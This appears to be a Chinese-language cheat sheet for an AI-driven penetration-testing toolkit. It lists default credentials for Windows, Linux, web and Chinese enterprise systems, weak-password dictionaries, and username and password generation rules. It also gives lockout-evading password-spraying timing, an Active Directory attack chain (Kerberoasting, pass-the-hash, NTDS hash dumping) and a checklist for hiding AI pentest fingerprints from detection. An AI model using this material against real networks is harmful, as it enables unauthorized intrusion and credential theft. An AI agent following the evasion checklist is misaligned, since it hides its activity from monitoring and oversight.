# Kali MCP 渗透字典与账号库（2026-08 增强）

> 来源: CyberStrike/autocve 方法论 + 实战经验 + SecLists 精选
> 位置: Kali 上 `/usr/share/seclists/` + 本仓库 `data/wordlists/`
> 用法: 配合 kerbrute/nxc/hydra 等工具

## 1. 高价值默认账号（内网横向首选）

### Windows/AD 相关
| 服务 | 默认账号 | 默认密码 |
|------|---------|---------|
| SMB/AD | Administrator | 空/Admin@123/P@ssw0rd |
| SMB/AD | Guest | 空（常启用） |
| MSSQL | sa | sa/Admin@123/1qaz@WSX |
| MSSQL | test | test/123456 |
| RDP | Administrator | Admin@123/Admin123! |
| IIS | iusr_machine | 随机（无用） |
| WinRM | Administrator | Admin@123/P@ssw0rd |

### Linux/Web 服务
| 服务 | 默认账号 | 默认密码 |
|------|---------|---------|
| SSH | root | root/toor/123456/admin |
| MySQL | root | root/123456/toor/空 |
| PostgreSQL | postgres | postgres/123456/password |
| Redis | (无认证) | requirepass 弱口令: redis/123456 |
| MongoDB | admin | admin/123456/空 |
| Tomcat | tomcat | tomcat/admin/role1 |
| Jenkins | admin | admin/123456/password |
| GitLab | root | root/5iveL!fe/Admin@123 |
| Grafana | admin | admin/prom-operator |
| Elasticsearch | (无认证) | 常无认证暴露 |

### 国产系统/中间件（中国环境重点）
| 服务 | 默认账号 | 默认密码 |
|------|---------|---------|
| 通达OA | admin | admin/td123456/空 |
| 致远OA | system | system/123456/init |
| 泛微OA | sysadmin | 1/1/admin/weaver |
| 用友NC | admin | admin/Nc123456/空 |
| 帆软FineReport | admin | admin/123456 |
| 若依Ruoyi | admin | admin123/admin@123 |
| 宝塔BT | admin | 随机（需爆破） |
| 禅道 | admin | 123456/Admin123 |
| 海康威视 | admin | admin/12345/123456 |
| 大华Dahua | admin | admin/123456/admin123 |
| 锐捷Ruijie | admin | admin/admin123 |
| 华三H3C | admin | admin/admin@h3c |
| 华为 | admin | Admin@123 |
| 深信服 | admin | admin/sangfor/Admin@123 |
| 天融信 | admin | admin/admin888 |
| 奇安信 | admin | admin/admin123 |

## 2. 密码字典策略

### 中文环境 Top 口令（社工优先）
```
admin123  admin@123  Admin@123  admin888  admin666
123456    12345678   123456789  1234567890 123123
888888    666666     000000     111111     5201314
qwe123    qweasd     asd123     abc123     a123456
Aa123456  Admin123   Password1  P@ssw0rd   Passw0rd
woaini    woshinibaba  nihao123  wang123   li123456
admin2024 admin2025  Admin2024  Admin2025
qwer1234  1qaz2wsx   zaq12wsx   zxcvbn    asdfgh
```

### 密码构造规则（生成用）
- 公司名 + 年份: `Company2024` / `company@2024`
- 拼音姓名 + 数字: `wangwei123` / `ZhangSan@2024`
- 首字母大写 + 特殊符: `Qwer@1234` / `Abc@123456`
- 键盘序列: `1qaz2wsx` / `qazwsx` / `zxcvbnm`
- 生日/电话: `19900101` / `13800138000` / `5201314`

## 3. 用户名字典策略（Kerbrute/密码喷洒）

### AD 用户名生成规则
- 姓名全拼: `zhangsan` / `wangwei`
- 姓名首字母: `zs` / `ww` / `zhangs`
- 姓名+数字: `zhangsan01` / `zs2024`
- 通用: `admin` / `administrator` / `test` / `user` / `service` / `svc_*` / `backup` / `sa`
- 服务账户: `svc_sql` / `svc_backup` / `sqlsvc` / `websvc` / `apache`

### 密码喷洒注意事项（低风险）
- 每用户只试 1-2 个密码（不触发锁定策略）
- 间隔 5-10 分钟（Kerberos 锁定策略常见 5 次/30 分钟）
- 优先试: 季节+年份 / 公司名+@+数字 / 弱口令

## 4. 内网横向攻击链速查

```
① 枚举: nxc smb <DC> -u '' -p '' (匿名) → kerbrute userenum → 用户名单
② 无口令: GetNPUsers.py (AS-REP) → hashcat -m 18200 破解
③ 有口令: GetUserSPNs.py (Kerberoast) → hashcat -m 13100 破解
④ 密码喷洒: nxc smb <DC> -u users.txt -p pass.txt --no-bruteforce
⑤ 哈希传递: nxc smb <target> -u admin -H <NTLM> --exec-method smbexec
⑥ 横向: psexec/smbexec/wmiexec <domain>/<user>:<pass>@<host>
⑦ 收割: secretsdump.py <domain>/<admin>@<DC> → NTDS 哈希
⑧ 提权: 检查 SUID/sudo/cron/内核版本/服务权限
```

## 5. 反检测清单（AI 渗透指纹隐藏）

- [ ] User-Agent 伪装为真实浏览器（见 `playbooks/stealth.py` UA_POOL）
- [ ] 请求间隔随机化 0.8-3.5s（模拟人工）
- [ ] nmap 用 `-T3` 而非 `-T4/T5`（低 IDS 特征）
- [ ] nuclei/ffuf 限速 `-rl 10` / `-rate 50`
- [ ] sqlmap 用 `--random-agent --delay=1`
- [ ] 优先经代理链（`PENTEST_PROXY` 环境变量）
- [ ] 避免工具默认 UA（python-requests/Go-http-client/curl/httpx）
- [ ] 扫描前先 `check_ai_fingerprint` 自测
